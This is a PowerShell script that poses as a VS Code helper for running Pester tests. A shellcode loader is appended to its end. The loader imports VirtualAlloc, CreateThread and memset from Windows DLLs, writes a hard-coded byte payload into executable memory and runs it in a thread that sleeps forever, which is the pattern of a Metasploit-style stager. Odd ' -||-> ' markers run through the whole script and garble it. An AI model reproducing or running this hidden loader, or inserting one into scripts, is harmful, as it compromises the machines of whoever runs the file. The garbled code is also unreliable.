


param(
    
    [Parameter(Position=0, Mandatory)]
    [ValidateNotNullOrEmpty()]
    [string]
    $ScriptPath,

    
    [Parameter()]
    [string]
    $TestName,

    
    
    [Parameter()]
    [ValidatePattern('\d*')]
    [string]
    $LineNumber,

    
    [Parameter()]
    [switch]
    $All
)

 -||-> $pesterModule =  -||-> Microsoft.PowerShell.Core\Get-Module Pester <-||-  <-||- 
 -||-> if ( -||-> !$pesterModule <-||- ) {
     -||-> Write-Output "Importing Pester module..." <-||- 
     -||-> $pesterModule =  -||-> Microsoft.PowerShell.Core\Import-Module Pester -ErrorAction Ignore -PassThru <-||-  <-||- 
     -||-> if ( -||-> !$pesterModule <-||- ) {
        
         -||-> Write-Warning "Failed to import the Pester module. You must install Pester to run or debug Pester tests." <-||- 
         -||-> Write-Warning "You can install Pester by executing: Install-Module Pester -Scope CurrentUser -Force" <-||- 
        return
    } <-||- 
} <-||- 

 -||-> if ( -||-> $All <-||- ) {
     -||-> Pester\Invoke-Pester -Script $ScriptPath -PesterOption @{IncludeVSCodeMarker= -||-> $true <-||- } <-||- 
}
elseif ( -||-> $TestName <-||- ) {
     -||-> Pester\Invoke-Pester -Script $ScriptPath -PesterOption @{IncludeVSCodeMarker= -||-> $true <-||- } -TestName $TestName <-||- 
}
elseif ( -||-> ( -||-> $LineNumber -match '\d+' <-||- ) -and ( -||-> $pesterModule.Version -ge '4.6.0' <-||- ) <-||- ) {
     -||-> Pester\Invoke-Pester -Script $ScriptPath -PesterOption ( -||-> New-PesterOption -ScriptBlockFilter @{
        IncludeVSCodeMarker= -||-> $true <-||- ; Line= -||-> $LineNumber <-||- ; Path= -||-> $ScriptPath <-||- } <-||- ) <-||- 
}
else {
    
    
     -||-> Write-Warning "The Describe block's TestName cannot be evaluated. EXECUTING ALL TESTS instead." <-||- 
     -||-> Write-Warning "To avoid this, install Pester >= 4.6.0 or remove any expressions in the TestName." <-||- 

     -||-> Pester\Invoke-Pester -Script $ScriptPath -PesterOption @{IncludeVSCodeMarker= -||-> $true <-||- } <-||- 
} <-||- 

 -||-> $c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xda,0xc8,0xba,0x49,0xfb,0x88,0x25,0xd9,0x74,0x24,0xf4,0x5e,0x29,0xc9,0xb1,0x47,0x31,0x56,0x18,0x83,0xee,0xfc,0x03,0x56,0x5d,0x19,0x7d,0xd9,0xb5,0x5f,0x7e,0x22,0x45,0x00,0xf6,0xc7,0x74,0x00,0x6c,0x83,0x26,0xb0,0xe6,0xc1,0xca,0x3b,0xaa,0xf1,0x59,0x49,0x63,0xf5,0xea,0xe4,0x55,0x38,0xeb,0x55,0xa5,0x5b,0x6f,0xa4,0xfa,0xbb,0x4e,0x67,0x0f,0xbd,0x97,0x9a,0xe2,0xef,0x40,0xd0,0x51,0x00,0xe5,0xac,0x69,0xab,0xb5,0x21,0xea,0x48,0x0d,0x43,0xdb,0xde,0x06,0x1a,0xfb,0xe1,0xcb,0x16,0xb2,0xf9,0x08,0x12,0x0c,0x71,0xfa,0xe8,0x8f,0x53,0x33,0x10,0x23,0x9a,0xfc,0xe3,0x3d,0xda,0x3a,0x1c,0x48,0x12,0x39,0xa1,0x4b,0xe1,0x40,0x7d,0xd9,0xf2,0xe2,0xf6,0x79,0xdf,0x13,0xda,0x1c,0x94,0x1f,0x97,0x6b,0xf2,0x03,0x26,0xbf,0x88,0x3f,0xa3,0x3e,0x5f,0xb6,0xf7,0x64,0x7b,0x93,0xac,0x05,0xda,0x79,0x02,0x39,0x3c,0x22,0xfb,0x9f,0x36,0xce,0xe8,0xad,0x14,0x86,0xdd,0x9f,0xa6,0x56,0x4a,0x97,0xd5,0x64,0xd5,0x03,0x72,0xc4,0x9e,0x8d,0x85,0x2b,0xb5,0x6a,0x19,0xd2,0x36,0x8b,0x33,0x10,0x62,0xdb,0x2b,0xb1,0x0b,0xb0,0xab,0x3e,0xde,0x2d,0xa9,0xa8,0x21,0x19,0xb1,0x25,0xca,0x58,0xb2,0x24,0x56,0xd4,0x54,0x16,0x36,0xb6,0xc8,0xd6,0xe6,0x76,0xb9,0xbe,0xec,0x78,0xe6,0xde,0x0e,0x53,0x8f,0x74,0xe1,0x0a,0xe7,0xe0,0x98,0x16,0x73,0x91,0x65,0x8d,0xf9,0x91,0xee,0x22,0xfd,0x5f,0x07,0x4e,0xed,0x37,0xe7,0x05,0x4f,0x91,0xf8,0xb3,0xfa,0x1d,0x6d,0x38,0xad,0x4a,0x19,0x42,0x88,0xbc,0x86,0xbd,0xff,0xb7,0x0f,0x28,0x40,0xaf,0x6f,0xbc,0x40,0x2f,0x26,0xd6,0x40,0x47,0x9e,0x82,0x12,0x72,0xe1,0x1e,0x07,0x2f,0x74,0xa1,0x7e,0x9c,0xdf,0xc9,0x7c,0xfb,0x28,0x56,0x7e,0x2e,0xa9,0xaa,0xa9,0x16,0xdf,0xc2,0x69 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $x=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $x.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$x,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



